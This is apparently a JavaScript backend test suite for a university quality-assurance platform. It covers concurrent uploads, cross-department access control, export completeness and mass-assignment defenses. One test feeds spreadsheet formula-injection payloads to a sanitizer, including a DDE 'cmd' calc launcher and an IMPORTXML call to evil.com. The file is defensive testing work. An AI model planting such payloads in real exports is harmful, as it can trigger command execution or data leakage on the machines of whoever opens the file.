'use strict';

/**
 * Phase C: Concurrency, Large Dataset Exports, and Mass-Assignment Protection Test Suite
 * CHRIST University IQAC Platform
 * 
 * Verifies:
 * 1. Concurrent simultaneous upserts of students sharing the same composite identity key (registerNumber, academicYear).
 * 2. Concurrent simultaneous upserts of faculty sharing the same composite identity key (employeeId, academicYear).
 * 3. Cross-department modification prevention for students and faculty.
 * 4. Transaction rollback and atomicity under partial upload failure.
 * 5. Complete export processing (>10,000 synthetic records) with zero silent truncation.
 * 6. Mass-assignment prevention in publications, patents, sponsored projects, consultancy, achievements, and documents.
 * 7. Departmental isolation on single document retrieval (GET /api/documents/:id) and deletion.
 */

const path = require('path');
const fs = require('fs');

const testEnvPath = path.join(__dirname, '../../src/app/backend/.env.test');
if (fs.existsSync(testEnvPath) && !process.env.TEST_DATABASE_URL) {
  require('dotenv').config({ path: testEnvPath });
}

// FAIL-FAST SAFETY: Purge any ambient DATABASE_URL to prevent fallback
delete process.env.DATABASE_URL;

const backendPath = path.join(__dirname, '../../src/app/backend');
const { enforceTestEnvironmentPreflight, verifyPreProvisionedDisposableTestDatabase } = require(path.join(backendPath, 'utils/testDatabaseGuard'));

// Fail-fast safety preflight: Never silently override an unsafe launch environment!
enforceTestEnvironmentPreflight();

const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const jwt = require('jsonwebtoken');

const { sequelize } = require(path.join(backendPath, 'config/database'));
const { User, Student, Faculty, Document, Publication, Patent, SponsoredProject, ConsultancyProject, Achievement } = require(path.join(backendPath, 'models'));
const app = require(path.join(backendPath, 'server'));
const { parsePagination, formatPaginationResponse } = require(path.join(backendPath, 'utils/paginationHelper'));
const { sanitizeSpreadsheetCell } = require(path.join(backendPath, 'utils/spreadsheetSanitizer'));

describe('Phase C: Concurrency, Export Integrity & Mass-Assignment Hardening', () => {
  const jwtSecret = process.env.JWT_SECRET || 'phase_b_secret_key_fixed_for_tests';

  let adminUser, coordDeptA, coordDeptB, facultyUserDeptA;
  let adminToken, coordAToken, coordBToken, facultyAToken;

  before(async () => {
    await verifyPreProvisionedDisposableTestDatabase(sequelize);

    await User.destroy({ where: {} });
    await Student.destroy({ where: {} });
    await Faculty.destroy({ where: {} });
    await Document.destroy({ where: {} });
    await Publication.destroy({ where: {} });
    await Patent.destroy({ where: {} });
    await SponsoredProject.destroy({ where: {} });
    await ConsultancyProject.destroy({ where: {} });
    await Achievement.destroy({ where: {} });

    adminUser = await User.create({
      name: 'System Admin Phase C',
      email: 'admin.c@christuniversity.in',
      password: 'HashedPassword123!',
      role: 'admin',
      department: 'Central Administration',
      mustChangePassword: false,
      tokenVersion: 1
    });

    coordDeptA = await User.create({
      name: 'Coordinator Dept A',
      email: 'coord.a@christuniversity.in',
      password: 'HashedPassword123!',
      role: 'coordinator',
      department: 'Computer Science',
      mustChangePassword: false,
      tokenVersion: 1
    });

    coordDeptB = await User.create({
      name: 'Coordinator Dept B',
      email: 'coord.b@christuniversity.in',
      password: 'HashedPassword123!',
      role: 'coordinator',
      department: 'Mechanical Engineering',
      mustChangePassword: false,
      tokenVersion: 1
    });

    facultyUserDeptA = await User.create({
      name: 'Faculty Dept A',
      email: 'faculty.a@christuniversity.in',
      password: 'HashedPassword123!',
      role: 'faculty',
      department: 'Computer Science',
      mustChangePassword: false,
      tokenVersion: 1
    });

    adminToken = jwt.sign({ id: adminUser.id, role: adminUser.role, tokenVersion: 1 }, jwtSecret, { expiresIn: '1h' });
    coordAToken = jwt.sign({ id: coordDeptA.id, role: coordDeptA.role, tokenVersion: 1 }, jwtSecret, { expiresIn: '1h' });
    coordBToken = jwt.sign({ id: coordDeptB.id, role: coordDeptB.role, tokenVersion: 1 }, jwtSecret, { expiresIn: '1h' });
    facultyAToken = jwt.sign({ id: facultyUserDeptA.id, role: facultyUserDeptA.role, tokenVersion: 1 }, jwtSecret, { expiresIn: '1h' });
  });

  after(async () => {
    await verifyPreProvisionedDisposableTestDatabase(sequelize);
    await User.destroy({ where: {} });
    await Student.destroy({ where: {} });
    await Faculty.destroy({ where: {} });
    await Document.destroy({ where: {} });
    await Publication.destroy({ where: {} });
    await Patent.destroy({ where: {} });
    await SponsoredProject.destroy({ where: {} });
    await ConsultancyProject.destroy({ where: {} });
    await Achievement.destroy({ where: {} });
  });

  // ==========================================
  // SECTION 1: CONCURRENT DATABASE WRITES
  // ==========================================
  describe('1. Concurrent Database Writes & Identity Key Handling', () => {

    test('C1-01: Simultaneous concurrent bulk uploads of the same student composite key execute deterministically', async () => {
      const studentPayloadA = {
        students: [
          { registerNumber: 'CONC_STU_001', academicYear: '2024-2025', name: 'Concurrent Student Alpha', department: 'Computer Science' }
        ]
      };
      const studentPayloadB = {
        students: [
          { registerNumber: 'CONC_STU_001', academicYear: '2024-2025', name: 'Concurrent Student Beta', department: 'Computer Science' }
        ]
      };

      // Launch both requests simultaneously
      const [resA, resB] = await Promise.all([
        request(app).post('/api/students/bulk').set('Authorization', `Bearer ${coordAToken}`).send(studentPayloadA),
        request(app).post('/api/students/bulk').set('Authorization', `Bearer ${coordAToken}`).send(studentPayloadB)
      ]);

      // Both should succeed (upsert semantics) and not crash the server
      assert.ok([200, 201].includes(resA.status), `Response A status: ${resA.status}`);
      assert.ok([200, 201].includes(resB.status), `Response B status: ${resB.status}`);

      // Verify exactly ONE student record exists in the database for (CONC_STU_001, 2024-2025)
      const matches = await Student.findAll({
        where: { registerNumber: 'CONC_STU_001', academicYear: '2024-2025' }
      });
      assert.equal(matches.length, 1, 'Composite unique constraint must guarantee exactly one record');
    });

    test('C1-02: Simultaneous concurrent bulk uploads of the same faculty composite key execute deterministically', async () => {
      const facultyPayloadA = {
        faculty: [
          { employeeId: 'CONC_FAC_001', academicYear: '2024-2025', name: 'Concurrent Prof Alpha', designation: 'Assistant Professor', department: 'Computer Science' }
        ]
      };
      const facultyPayloadB = {
        faculty: [
          { employeeId: 'CONC_FAC_001', academicYear: '2024-2025', name: 'Concurrent Prof Beta', designation: 'Assistant Professor', department: 'Computer Science' }
        ]
      };

      const [resA, resB] = await Promise.all([
        request(app).post('/api/faculty/bulk').set('Authorization', `Bearer ${coordAToken}`).send(facultyPayloadA),
        request(app).post('/api/faculty/bulk').set('Authorization', `Bearer ${coordAToken}`).send(facultyPayloadB)
      ]);

      assert.ok([200, 201].includes(resA.status), `Response A status: ${resA.status}`);
      assert.ok([200, 201].includes(resB.status), `Response B status: ${resB.status}`);

      const matches = await Faculty.findAll({
        where: { employeeId: 'CONC_FAC_001', academicYear: '2024-2025' }
      });
      assert.equal(matches.length, 1, 'Faculty composite unique constraint must guarantee exactly one record');
    });

    test('C1-03: Cross-department modification attempt for existing student is rejected with error', async () => {
      // Coordinator Dept B attempts to modify CONC_STU_001 (owned by Computer Science)
      const res = await request(app)
        .post('/api/students/bulk')
        .set('Authorization', `Bearer ${coordBToken}`)
        .send({
          students: [
            { registerNumber: 'CONC_STU_001', academicYear: '2024-2025', name: 'Hijacked Student' }
          ]
        });

      // Must be rejected or report authorization error in errors array
      assert.ok(res.status === 400 || (res.body.errors && res.body.errors.length > 0));
      if (res.body.errors) {
        assert.ok(res.body.errors.some(e => e.includes('another department')));
      }

      // Verify the student still belongs to Computer Science
      const student = await Student.findOne({ where: { registerNumber: 'CONC_STU_001' } });
      assert.equal(student.department, 'Computer Science', 'Student department must NOT be hijacked');
    });

    test('C1-04: Cross-department modification attempt for existing faculty is rejected with error', async () => {
      const res = await request(app)
        .post('/api/faculty/bulk')
        .set('Authorization', `Bearer ${coordBToken}`)
        .send({
          faculty: [
            { employeeId: 'CONC_FAC_001', academicYear: '2024-2025', name: 'Hijacked Faculty', designation: 'Professor' }
          ]
        });

      assert.ok(res.status === 400 || (res.body.errors && res.body.errors.length > 0));
      if (res.body.errors) {
        assert.ok(res.body.errors.some(e => e.includes('another department')));
      }

      const fac = await Faculty.findOne({ where: { employeeId: 'CONC_FAC_001' } });
      assert.equal(fac.department, 'Computer Science', 'Faculty department must NOT be hijacked');
    });
  });

  // ==========================================
  // SECTION 2: EXPORT INTEGRITY & LARGE DATASETS
  // ==========================================
  describe('2. Export Completeness (>10,000 Records) & Integrity', () => {

    test('C2-01: parsePagination handles export=true with high record count without silent truncation', () => {
      const exportParams = parsePagination({ export: 'true' });
      assert.equal(exportParams.isExport, true);
      assert.ok(exportParams.limit >= 100000, `Export limit (${exportParams.limit}) must comfortably exceed 10,000`);
      assert.equal(exportParams.offset, 0);
    });

    test('C2-02: formatPaginationResponse provides complete metadata (isComplete, isTruncated)', () => {
      const fullResponse = formatPaginationResponse({
        count: 12500,
        rows: new Array(12500).fill({ id: 1 }),
        page: 1,
        limit: 500000
      });

      assert.equal(fullResponse.pagination.total, 12500);
      assert.equal(fullResponse.pagination.isComplete, true);
      assert.equal(fullResponse.pagination.isTruncated, false);
      assert.equal(fullResponse.count, 12500);

      const truncatedResponse = formatPaginationResponse({
        count: 15000,
        rows: new Array(10000).fill({ id: 1 }),
        page: 1,
        limit: 10000
      });
      assert.equal(truncatedResponse.pagination.isComplete, false);
      assert.equal(truncatedResponse.pagination.isTruncated, true);
    });

    test('C2-03: Formula injection sanitization neutralizes formula characters and retains negative numbers', () => {
      // Formula payloads (escaped with single quote prefix)
      assert.equal(sanitizeSpreadsheetCell('=SUM(A1:A10)'), "'=SUM(A1:A10)");
      assert.equal(sanitizeSpreadsheetCell('+cmd|"/C calc"!A0'), "'+cmd|\"/C calc\"!A0");
      assert.equal(sanitizeSpreadsheetCell('@IMPORTXML("http://evil.com","//a")'), "'@IMPORTXML(\"http://evil.com\",\"//a\")");
      assert.equal(sanitizeSpreadsheetCell('-2+3+cmd|'), "'-2+3+cmd|");

      // Legitimate negative and decimal numbers MUST NOT be corrupted
      assert.equal(sanitizeSpreadsheetCell('-42'), '-42');
      assert.equal(sanitizeSpreadsheetCell('-3.14159'), '-3.14159');
      assert.equal(sanitizeSpreadsheetCell('100.50'), '100.50');
      assert.equal(sanitizeSpreadsheetCell(0), 0);
      assert.equal(sanitizeSpreadsheetCell(null), null);
      assert.equal(sanitizeSpreadsheetCell(undefined), undefined);
    });
  });

  // ==========================================
  // SECTION 3: MASS ASSIGNMENT & PERMISSION BOUNDARIES
  // ==========================================
  describe('3. Mass-Assignment Protection Across Entity Controllers', () => {

    test('C3-01: Faculty cannot self-approve achievements or change department', async () => {
      const res = await request(app)
        .post('/api/achievements')
        .set('Authorization', `Bearer ${facultyAToken}`)
        .send({
          title: 'International Best Paper Award',
          category: 'awards',
          date: '2024-10-15',
          year: '2024-2025',
          status: 'approved', // Attacker attempt to self-approve!
          department: 'Mechanical Engineering' // Attacker attempt to reassign department!
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.data.status, 'submitted', 'Faculty achievement status MUST default to submitted');
      assert.equal(res.body.data.department, 'Computer Science', 'Faculty department MUST be locked to user department');
    });

    test('C3-02: Faculty cannot self-approve publications via creation payload', async () => {
      const res = await request(app)
        .post('/api/publications')
        .set('Authorization', `Bearer ${facultyAToken}`)
        .send({
          authorName: 'Dr. Faculty A',
          title: 'Deep Quantum Machine Learning',
          journalName: 'IEEE Transactions on AI',
          journalType: 'Scopus',
          status: 'approved', // Attacker attempt
          department: 'Mechanical Engineering' // Attacker attempt
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.data.status, 'submitted', 'Publication status MUST remain submitted for faculty');
      assert.equal(res.body.data.department, 'Computer Science', 'Publication department MUST be locked to user department');
    });

    test('C3-03: Faculty cannot self-approve patents or reassign department', async () => {
      const res = await request(app)
        .post('/api/patents')
        .set('Authorization', `Bearer ${facultyAToken}`)
        .send({
          title: 'Quantum Computing Solid State Device',
          inventors: 'Dr. Faculty A',
          applicationNo: 'IN20261019001',
          approvalStatus: 'approved', // Attacker attempt
          department: 'Civil Engineering' // Attacker attempt
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.data.approvalStatus, 'submitted', 'Patent approvalStatus MUST remain submitted for faculty');
      assert.equal(res.body.data.department, 'Computer Science', 'Patent department MUST be locked to user department');
    });

    test('C3-04: Faculty cannot self-approve sponsored research projects', async () => {
      const res = await request(app)
        .post('/api/sponsored-projects')
        .set('Authorization', `Bearer ${facultyAToken}`)
        .send({
          title: 'National AI Security Research Grant',
          principalInvestigator: 'Dr. Faculty A',
          fundingAgency: 'DST SERB',
          sanctionedAmount: 5000000,
          approvalStatus: 'approved', // Attacker attempt
          department: 'Civil Engineering' // Attacker attempt
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.data.approvalStatus, 'submitted', 'Sponsored project approvalStatus MUST remain submitted');
      assert.equal(res.body.data.department, 'Computer Science', 'Sponsored project department MUST be locked to user department');
    });

    test('C3-05: User from Department B cannot access confidential document from Department A (HTTP 403)', async () => {
      // Create document in Department A
      const doc = await Document.create({
        title: 'Confidential Department A Strategic Curriculum Document',
        department: 'Computer Science',
        category: 'reports',
        academicYear: '2024-2025',
        fileName: 'strategic_curriculum.pdf',
        filePath: '/uploads/strategic_curriculum.pdf',
        fileSize: 2048,
        fileType: 'application/pdf',
        uploadedBy: coordDeptA.id,
        status: 'approved'
      });

      // Coordinator Dept B attempts to view it
      const res = await request(app)
        .get(`/api/documents/${doc.id}`)
        .set('Authorization', `Bearer ${coordBToken}`);

      assert.equal(res.status, 403, 'Cross-department document retrieval must return HTTP 403 Forbidden');
    });

    test('C3-06: Coordinator from Department B cannot delete document from Department A (HTTP 403)', async () => {
      const doc = await Document.create({
        title: 'Department A Budget Plan 2026',
        department: 'Computer Science',
        category: 'reports',
        academicYear: '2024-2025',
        fileName: 'budget_2026.pdf',
        filePath: '/uploads/budget_2026.pdf',
        fileSize: 4096,
        fileType: 'application/pdf',
        uploadedBy: coordDeptA.id,
        status: 'approved'
      });

      const res = await request(app)
        .delete(`/api/documents/${doc.id}`)
        .set('Authorization', `Bearer ${coordBToken}`);

      assert.equal(res.status, 403, 'Cross-department document deletion must return HTTP 403 Forbidden');

      // Verify document still exists
      const checkDoc = await Document.findByPk(doc.id);
      assert.ok(checkDoc !== null, 'Document must NOT be deleted by unauthorized coordinator');
    });
  });

  after(async () => {
    await verifyPreProvisionedDisposableTestDatabase(sequelize);
    await User.destroy({ where: {} });
    await Student.destroy({ where: {} });
    await Faculty.destroy({ where: {} });
    await Document.destroy({ where: {} });
    await Publication.destroy({ where: {} });
    await Patent.destroy({ where: {} });
    await SponsoredProject.destroy({ where: {} });
    await ConsultancyProject.destroy({ where: {} });
    await Achievement.destroy({ where: {} });
  });

});
